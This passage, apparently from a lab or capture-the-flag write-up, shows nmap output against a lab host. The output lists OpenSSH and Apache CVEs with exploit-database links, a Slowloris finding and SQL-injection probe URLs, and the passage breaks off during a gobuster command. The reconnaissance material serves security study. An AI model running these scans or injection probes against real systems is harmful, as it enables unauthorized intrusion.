\tEXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t5.0\thttps://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t*EXPLOIT*\n|     \tEDB-ID:45939\t5.0\thttps://vulners.com/exploitdb/EDB-ID:45939\t*EXPLOIT*\n|     \tEDB-ID:45233\t5.0\thttps://vulners.com/exploitdb/EDB-ID:45233\t*EXPLOIT*\n|     \tCVE-2018-15919\t5.0\thttps://vulners.com/cve/CVE-2018-15919\n|     \tCVE-2018-15473\t5.0\thttps://vulners.com/cve/CVE-2018-15473\n|     \tCVE-2017-15906\t5.0\thttps://vulners.com/cve/CVE-2017-15906\n|     \tCVE-2016-10708\t5.0\thttps://vulners.com/cve/CVE-2016-10708\n|     \t1337DAY-ID-31730\t5.0\thttps://vulners.com/zdt/1337DAY-ID-31730\t*EXPLOIT*\n|     \tCVE-2021-41617\t4.4\thttps://vulners.com/cve/CVE-2021-41617\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t*EXPLOIT*\n|     \tEXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF\t4.3\thttps://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF\t*EXPLOIT*\n|     \tEXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF\t4.3\thttps://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF\t*EXPLOIT*\n|     \tEDB-ID:40136\t4.3\thttps://vulners.com/exploitdb/EDB-ID:40136\t*EXPLOIT*\n|     \tEDB-ID:40113\t4.3\thttps://vulners.com/exploitdb/EDB-ID:40113\t*EXPLOIT*\n|     \tCVE-2020-14145\t4.3\thttps://vulners.com/cve/CVE-2020-14145\n|     \tCVE-2016-6210\t4.3\thttps://vulners.com/cve/CVE-2016-6210\n|     \t1337DAY-ID-25440\t4.3\thttps://vulners.com/zdt/1337DAY-ID-25440\t*EXPLOIT*\n|     \t1337DAY-ID-25438\t4.3\thttps://vulners.com/zdt/1337DAY-ID-25438\t*EXPLOIT*\n|     \tCVE-2019-6110\t4.0\thttps://vulners.com/cve/CVE-2019-6110\n|     \tCVE-2019-6109\t4.0\thttps://vulners.com/cve/CVE-2019-6109\n|     \tCVE-2018-20685\t2.6\thttps://vulners.com/cve/CVE-2018-20685\n|     \tSSV:92581\t2.1\thttps://vulners.com/seebug/SSV:92581\t*EXPLOIT*\n|     \tCVE-2016-10011\t2.1\thttps://vulners.com/cve/CVE-2016-10011\n|     \tSRC-2016-0002\t0.0\thttps://vulners.com/srcincite/SRC-2016-0002\t*EXPLOIT*\n|     \tPACKETSTORM:151227\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:151227\t*EXPLOIT*\n|     \tPACKETSTORM:140261\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:140261\t*EXPLOIT*\n|     \tPACKETSTORM:138006\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:138006\t*EXPLOIT*\n|     \tPACKETSTORM:137942\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:137942\t*EXPLOIT*\n|_    \t1337DAY-ID-30937\t0.0\thttps://vulners.com/zdt/1337DAY-ID-30937\t*EXPLOIT*\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server&#039;s resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       http://ha.ckers.org/slowloris/\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n| http-fileupload-exploiter: \n|   \n|     Couldn&#039;t find a file-type field.\n|   \n|_    Couldn&#039;t find a file-type field.\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n| http-sql-injection: \n|   Possible sqli for queries:\n|     http://10.10.105.134:80/item.php?id=1%27%20OR%20sqlspider\n|     http://10.10.105.134:80/item.php?id=2%27%20OR%20sqlspider\n|     http://10.10.105.134:80/item.php?id=3%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DD%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DD%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DD%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DD%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DD%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|_    http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider\n| vulners: \n|   cpe:/a:apache:http_server:2.4.18: \n|     \tCVE-2021-44790\t7.5\thttps://vulners.com/cve/CVE-2021-44790\n|     \tCVE-2021-39275\t7.5\thttps://vulners.com/cve/CVE-2021-39275\n|     \tCVE-2021-26691\t7.5\thttps://vulners.com/cve/CVE-2021-26691\n|     \tCVE-2017-7679\t7.5\thttps://vulners.com/cve/CVE-2017-7679\n|     \tCVE-2017-7668\t7.5\thttps://vulners.com/cve/CVE-2017-7668\n|     \tCVE-2017-3169\t7.5\thttps://vulners.com/cve/CVE-2017-3169\n|     \tCVE-2017-3167\t7.5\thttps://vulners.com/cve/CVE-2017-3167\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/\t7.2\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/\t7.2\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/\t*EXPLOIT*\n|     \tEXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB\t7.2\thttps://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB\t*EXPLOIT*\n|     \tEDB-ID:46676\t7.2\thttps://vulners.com/exploitdb/EDB-ID:46676\t*EXPLOIT*\n|     \tCVE-2019-0211\t7.2\thttps://vulners.com/cve/CVE-2019-0211\n|     \t1337DAY-ID-32502\t7.2\thttps://vulners.com/zdt/1337DAY-ID-32502\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1312/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/FREEBSD-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tFDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8\t6.8\thttps://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8\t*EXPLOIT*\n|     \tCVE-2021-40438\t6.8\thttps://vulners.com/cve/CVE-2021-40438\n|     \tCVE-2020-35452\t6.8\thttps://vulners.com/cve/CVE-2020-35452\n|     \tCVE-2018-1312\t6.8\thttps://vulners.com/cve/CVE-2018-1312\n|     \tCVE-2017-15715\t6.8\thttps://vulners.com/cve/CVE-2017-15715\n|     \t4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332\t6.8\thttps://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332\t*EXPLOIT*\n|     \tCVE-2021-44224\t6.4\thttps://vulners.com/cve/CVE-2021-44224\n|     \tCVE-2019-10082\t6.4\thttps://vulners.com/cve/CVE-2019-10082\n|     \tCVE-2017-9788\t6.4\thttps://vulners.com/cve/CVE-2017-9788\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/\t6.0\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/\t6.0\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/\t*EXPLOIT*\n|     \tCVE-2019-0217\t6.0\thttps://vulners.com/cve/CVE-2019-0217\n|     \tCVE-2020-1927\t5.8\thttps://vulners.com/cve/CVE-2020-1927\n|     \tCVE-2019-10098\t5.8\thttps://vulners.com/cve/CVE-2019-10098\n|     \t1337DAY-ID-33577\t5.8\thttps://vulners.com/zdt/1337DAY-ID-33577\t*EXPLOIT*\n|     \tCVE-2016-5387\t5.1\thttps://vulners.com/cve/CVE-2016-5387\n|     \tSSV:96537\t5.0\thttps://vulners.com/seebug/SSV:96537\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1333/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1303/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED\t5.0\thttps://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED\t*EXPLOIT*\n|     \tEXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D\t5.0\thttps://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D\t*EXPLOIT*\n|     \tEXPLOITPACK:2666FB0676B4B582D689921651A30355\t5.0\thttps://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355\t*EXPLOIT*\n|     \tEDB-ID:42745\t5.0\thttps://vulners.com/exploitdb/EDB-ID:42745\t*EXPLOIT*\n|     \tEDB-ID:40909\t5.0\thttps://vulners.com/exploitdb/EDB-ID:40909\t*EXPLOIT*\n|     \tCVE-2021-34798\t5.0\thttps://vulners.com/cve/CVE-2021-34798\n|     \tCVE-2021-33193\t5.0\thttps://vulners.com/cve/CVE-2021-33193\n|     \tCVE-2021-26690\t5.0\thttps://vulners.com/cve/CVE-2021-26690\n|     \tCVE-2020-1934\t5.0\thttps://vulners.com/cve/CVE-2020-1934\n|     \tCVE-2019-17567\t5.0\thttps://vulners.com/cve/CVE-2019-17567\n|     \tCVE-2019-0220\t5.0\thttps://vulners.com/cve/CVE-2019-0220\n|     \tCVE-2019-0196\t5.0\thttps://vulners.com/cve/CVE-2019-0196\n|     \tCVE-2018-17199\t5.0\thttps://vulners.com/cve/CVE-2018-17199\n|     \tCVE-2018-17189\t5.0\thttps://vulners.com/cve/CVE-2018-17189\n|     \tCVE-2018-1333\t5.0\thttps://vulners.com/cve/CVE-2018-1333\n|     \tCVE-2018-1303\t5.0\thttps://vulners.com/cve/CVE-2018-1303\n|     \tCVE-2017-9798\t5.0\thttps://vulners.com/cve/CVE-2017-9798\n|     \tCVE-2017-15710\t5.0\thttps://vulners.com/cve/CVE-2017-15710\n|     \tCVE-2016-8743\t5.0\thttps://vulners.com/cve/CVE-2016-8743\n|     \tCVE-2016-8740\t5.0\thttps://vulners.com/cve/CVE-2016-8740\n|     \tCVE-2016-4979\t5.0\thttps://vulners.com/cve/CVE-2016-4979\n|     \t1337DAY-ID-28573\t5.0\thttps://vulners.com/zdt/1337DAY-ID-28573\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/\t4.9\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/\t*EXPLOIT*\n|     \tCVE-2019-0197\t4.9\thttps://vulners.com/cve/CVE-2019-0197\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1302/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1301/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-10092/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/\t*EXPLOIT*\n|     \tCVE-2020-11985\t4.3\thttps://vulners.com/cve/CVE-2020-11985\n|     \tCVE-2019-10092\t4.3\thttps://vulners.com/cve/CVE-2019-10092\n|     \tCVE-2018-1302\t4.3\thttps://vulners.com/cve/CVE-2018-1302\n|     \tCVE-2018-1301\t4.3\thttps://vulners.com/cve/CVE-2018-1301\n|     \tCVE-2018-11763\t4.3\thttps://vulners.com/cve/CVE-2018-11763\n|     \tCVE-2016-4975\t4.3\thttps://vulners.com/cve/CVE-2016-4975\n|     \tCVE-2016-1546\t4.3\thttps://vulners.com/cve/CVE-2016-1546\n|     \t4013EC74-B3C1-5D95-938A-54197A58586D\t4.3\thttps://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D\t*EXPLOIT*\n|     \t1337DAY-ID-33575\t4.3\thttps://vulners.com/zdt/1337DAY-ID-33575\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/\t*EXPLOIT*\n|     \tCVE-2018-1283\t3.5\thttps://vulners.com/cve/CVE-2018-1283\n|     \tCVE-2016-8612\t3.3\thttps://vulners.com/cve/CVE-2016-8612\n|     \tPACKETSTORM:152441\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:152441\t*EXPLOIT*\n|_    \tMSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/\t0.0\thttps://vulners.com/metasploit/MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/\t*EXPLOIT*\n| http-enum: \n|_  /robots.txt: Robots file\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=2/2%OT=22%CT=1%CU=42651%PV=Y%DS=4%DC=T%G=Y%TM=61FB4F78\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS(\nOS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11\nOS:NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(\nOS:R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nUptime guess: 0.010 days (since Wed Feb  2 20:30:09 2022)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=264 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 21/tcp)\nHOP RTT       ADDRESS\n1   35.71 ms  10.13.0.1\n2   ... 3\n4   170.37 ms 10.10.105.134\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Wed Feb  2 20:43:52 2022 -- 1 IP address (1 host up) scanned in 915.75 seconds\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; and Apache on port 80. Pretty standard. There is an enumerated /robots.txt file, which turns out to be invalid — it contains only the phrase “Wubbalubbadubdub”.&lt;/p&gt;\n&lt;p&gt;Let’s also hit the target with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/gobuster&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 50&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http://10.10.105.134&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; 